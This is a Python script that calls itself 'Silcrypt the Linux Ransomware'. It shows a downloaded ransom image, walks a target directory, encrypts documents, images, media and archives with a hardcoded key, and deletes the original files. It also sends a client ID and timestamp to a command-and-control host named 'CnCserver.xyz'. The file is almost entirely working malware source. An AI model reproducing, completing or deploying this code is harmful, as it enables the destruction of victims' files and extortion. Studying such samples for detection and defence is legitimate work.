#!/usr/bin/python
import os 
import urllib
import random
import struct
import smtplib
import string
import datetime
import time
import ctypes
import requests
from multiprocessing import Pool
from simplecrypt import encrypt, decrypt

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA


from Tkinter import *
from PIL import Image,ImageTk
import ctypes

urllib.urlretrieve("https://example.com/Silcrypt.jpg", "Silcrypt.jpg")
def main():
    r = Tk()
    r.title('Image')
    r.geometry('1280x840')
    i = Image.open('Silcrypt.jpg')
    p = ImageTk.PhotoImage(i)
    l = Label(r,image= p)
    l.image = p 
    l.place(x=0,y=0)
    r.mainloop()

ID = ''
files_to_enc = []
key = "PASSWORD"


def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
    global ID
    ID = ''.join(random.choice(chars) for _ in range(size))


def send_ID_Key():
    ts = datetime.datetime.now()
    SERVER = "CnCserver.xyz"         
    PORT = 80                        
    url = "index?Date="+str(ts)+"&ClientID="+str(ID)
    full_url = "http://"+SERVER+"/"+url
    try:              
        r=requests.get(full_url)
        #urllib2.urlopen(full_url).read()
    except Exception as e:
        pass
    
def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    print (in_filename)
    
    if not out_filename:
        out_filename = in_filename + '.Silcrypt'

    
    filesize = os.path.getsize(in_filename)
    with open(in_filename,'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            ciphertext = encrypt(key,infile.read())
            outfile.write(ciphertext)
        

def single_arg_encrypt_file(in_filename):
    encrypt_file(key, in_filename)

def selectfiles():
    files_to_enc = []
    for root, dirs, files in os.walk("/root/Dokumente/test/", topdown=True):
        for file in files:
            if file.endswith(".txt"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".png"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".jpg"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".jpeg"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".pdf"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".pptx"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".docx"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".xls"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".mp3"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".mp4"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".html"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".css"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".js"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".txt"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".psd"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".xml"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".zip"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".bat"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".pps"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".ppt"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))
            if file.endswith(".mpeg"):
                encrypt_file(key,os.path.join(root, file))
                os.remove(os.path.join(root,file))

print("   _________      .__                               __                         ")
print("  /   _____/__.__.|  |   ___________ ___.__._______/  |_                       ")
print("  \_____  <   |  ||  | _/ ___\_  __ <   |  |\____ \   __\                      ")
print("  /        \___  ||  |_\  \___|  | \/\___  ||  |_> >  |                        ")
print(" /_______  / ____||____/\___  >__|   / ____||   __/|__|                        ")
print("         \/\/               \/       \/     |__|                               ")
print("   __  .__             .____    .__                                            ")
print(" _/  |_|  |__   ____   |    |   |__| ____  __ _____  ___                       ")
print(" \   __\  |  \_/ __ \  |    |   |  |/    \|  |  \  \/  /                       ")
print("  |  | |   Y  \  ___/  |    |___|  |   |  \  |  />    <                        ")
print("  |__| |___|  /\___  > |_______ \__|___|  /____//__/\_ \                       ")
print("            \/     \/          \/       \/            \/                       ")
print(" __________                                                                    ")
print(" \______   \_____    ____   __________   _______  _  _______ _______   ____    ")
print("  |       _/\__  \  /    \ /  ___/  _ \ /     \ \/ \/ /\__  \\_  __ \_/ __ \   ")
print("  |    |   \ / __ \|   |  \\___ (  <_> )  Y Y  \     /  / __ \|  | \/\  ___/   ")
print("  |____|_  /(____  /___|  /____  >____/|__|_|  /\/\_/  (____  /__|    \___  >  ")
print("         \/      \/     \/     \/            \/             \/            \/   Coded by 'Silky' ")
main()
while True:
    for root, dirs, files in os.walk("/root/Dokumente/test/", topdown=True):
        for file in dirs:
            for root, dirs, files in os.walk(".", topdown=True):
                for file in dirs:
		    selectfiles()
    send_ID_Key()

pool = Pool(processes=4)
selectfiles()
